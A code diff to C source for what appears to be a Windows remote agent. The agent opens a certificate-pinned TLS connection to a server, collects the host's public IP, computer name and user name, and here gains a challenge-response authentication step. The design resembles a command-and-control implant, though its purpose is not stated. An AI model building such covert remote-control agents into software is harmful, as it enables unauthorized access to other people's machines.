@@ -265,6 +265,11 @@ static void FetchCountry() {
   char* i = strstr(buf, "\"ip\":\"");
   if (i) { i += 6; char* e = strchr(i, '"'); if (e) { *e = 0; snprintf(g_pubip, sizeof(g_pubip), "%s", i); } }
 }
+static bool AuthAgent(TlsCtx* t) {
+  uint16_t cmd = 0; char* p = NULL; uint32_t n = 0; unsigned char proof[32];
+  bool ok = TlsRecvMsg(t, &cmd, &p, &n) && cmd == C_AUTH && n == 16 && AuthProof((unsigned char*)p, n, proof) && TlsSendMsg(t, C_AUTH, proof, 32);
+  free(p); return ok;
+}
 static DWORD WINAPI Worker(const char* addr) {
   char host[256] = {0}; int port = 8443;
   strncpy(host, addr, 255);
@@ -283,7 +288,7 @@ static DWORD WINAPI Worker(const char* addr) {
   freeaddrinfo(ai); if (s == INVALID_SOCKET) return 0;
   TlsCtx* t = (TlsCtx*)malloc(sizeof(TlsCtx)); if (!t) return 0;
   InitTlsCtx(t, s);
-  if (!TlsAcquire(t, NULL) || !TlsHandshake(t, kPin)) { free(t); closesocket(s); return 0; }
+  if (!TlsAcquire(t, NULL) || !TlsHandshake(t, kPin) || !AuthAgent(t)) { FreeTlsCtx(t); free(t); closesocket(s); return 0; }
   EnterCriticalSection(&g_cs); g_tls = t; LeaveCriticalSection(&g_cs);
   char hbuf[256] = {0}, ubuf[256] = {0}; DWORD n = sizeof(hbuf);
   GetComputerNameA(hbuf, &n); n = sizeof(ubuf); GetUserNameA(ubuf, &n);
